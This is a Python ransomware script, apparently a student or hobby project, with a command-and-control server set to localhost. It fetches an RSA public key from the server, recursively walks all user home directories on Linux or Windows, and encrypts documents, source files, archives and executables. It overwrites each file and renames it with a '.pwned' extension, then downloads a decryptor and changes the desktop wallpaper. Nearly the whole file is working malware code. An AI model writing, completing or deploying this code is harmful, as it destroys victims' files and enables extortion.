import os, random, sys, string
import cryptography
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import requests
import ctypes
import uuid
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

#########  GLOBAL VARIABLES CHANGED PER SESSION ###########
# URL of C2 server
SERVER = "http://localhost:5000"

CONFIG_FILE_NAME = "config.pwnmaster"

WINDOWS_ROOT = "C:/Users/"

LINUX_ROOT = "/home"




_uuid = ""
PUBLICKEY=""
public_key = ""

BACKGROUND_FILE_NAME="r_background.jpg"

#Just a handful of 
extensions = [".docx", ".txt", ".py", ".cpp", ".pdf", ".h", ".exe", ".doc", ".mp3", ".avi", ".mpeg", ".java", ".deb", ".tar", ".gz", ".gzip", ".zip"]

#Requests public RSA key from server.  Saved key too file in the PUBLICKEY global variable
def get_key_to_disk():
	try: 
		key = requests.get(SERVER+"/encrypt/"+_uuid)
		if(key.status_code != 200):
			print("Server Offline, exiting...")
			sys.exit()
		else:
			print("Writing Public Key...")
			with open(PUBLICKEY, 'wb') as file:
				file.write(key.content)
		print("Key is now on disk...")
	except Exception as e:
		print("Could not establish session with server...")
		pass
#loads in RSA Key from PUBLICKEY and returns the operational key in memory
def load_key():
	try:
		with open(PUBLICKEY, "rb") as f:
			public_key_string = f.read()
		f.close()
		_public_key = RSA.importKey(public_key_string)
		return _public_key
	except Exception as e:
		print(e)
		pass
#uses the public key returned by load_key and a message and encrypts the message
def encrypt_message(_public_key, message):
	try:
		encrypt_cipher = PKCS1_OAEP.new(_public_key)
		encrypted = encrypt_cipher.encrypt(message)
		return encrypted
	except Exception as e:
		print(e)
		pass
#Reads in information from a given file and calls encrypt_message() to encrypt the file contents,
# then calls save_encrypted_to_disk() to save the encrypted version of the file. 
def encrypt_file(filename, _public_key):
	try:
		with open(filename, "rb") as file:
			message = file.read()
		file.close()
		encrypted_message = encrypt_message(_public_key, message)
		save_encrypted_to_disk(filename, encrypted_message)
	except Exception as e:
		print(e)
		pass
#Takes the given file and encrypted version of the message and overwrites the original contents
# while also adding the .pwned file extension
def save_encrypted_to_disk(filename, encrypted_message):
	try:
		new_file_name = filename + ".pwned"
		new_file = open(filename, 'wb')
		new_file.write(encrypted_message)
		new_file.close()
		os.rename(filename, new_file_name)
		print(filename + " encrypted successfully!")
	except Exception as e:
		print(e)
		pass
# Accepts a start directory and the public key as arguements, recursivly travels through all child directories and 
# encrypts all files that end with certain file extenstions 
def traverse_and_encrypt(root_directory, key):
	try:
		for dirpath, dirs, files in os.walk(root_directory):
			path = dirpath.split('/')
			for f in files:
				if(f.endswith(tuple(extensions))):
					if(dirpath == root_directory):
						f_name = root_directory + "/" + f
					else:
						f_name = dirpath + "/" + f
					#print(f_name)
					encrypt_file(f_name, key)
	except Exception as e:
		print(e)
		pass


#checks if config file is present in current working directory
# if not a new config file is created that has the following information: 
# UUID
def get_config_info():
	_id = ""
	if(os.path.exists(CONFIG_FILE_NAME)):
		with open(CONFIG_FILE_NAME, "rb") as file:
			_id = file.read()
		file.close()
	else:
		_id = str(uuid.uuid1())
		with open(CONFIG_FILE_NAME, "w") as f:
			f.write(_id)
		f.close()
	return _id

def define_public_key(_id):
	return "CLIENT_" + _id + ".pem"

def set_background():
	try:
		if(os.name == "posix"):
			os.system("gsettings set org.gnome.desktop.background picture-uri 'file:" + os.getcwd() + "/" + BACKGROUND_FILE_NAME + "'")
		elif(os.name == "nt"):
			username = str(os.getenv('username'))
			SPI_SETDESKWALLPAPER = 20
			ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, BACKGROUND_FILE_NAME, 0)
	except Exception as e:
		print(e)
		pass 

def save_decryptor_to_disk():
	try:
		decryptor = requests.get(SERVER + "/decryptor")
		if(decryptor.status_code != 200):
			print("There was an issue getting your decryptor file, it seems the server is temporarly unavailable.")
			print("Please try again by getting the file found at " + SERVER + "/decryptor")
		else:
			with open("decryptor.py", "wb") as file:
				file.write(decryptor.content)
			file.close()
			print("The file you will need to decrypt your files is saved at " + str(os.getcwd()) + "/decryptor.py")
	except Exception as e:
		print(e)
		pass
	

############# CODE for ENCRYPTION #######################

_uuid = get_config_info()
PUBLICKEY = define_public_key(_uuid)
print(_uuid)
get_key_to_disk()

key = load_key()
print("Done")
if(os.name == 'posix'):
	traverse_and_encrypt(LINUX_ROOT, key)
elif(os.name == 'nt'):
	traverse_and_encrypt(WINDOWS_ROOT, key)
save_decryptor_to_disk()
set_background()
##############################################################




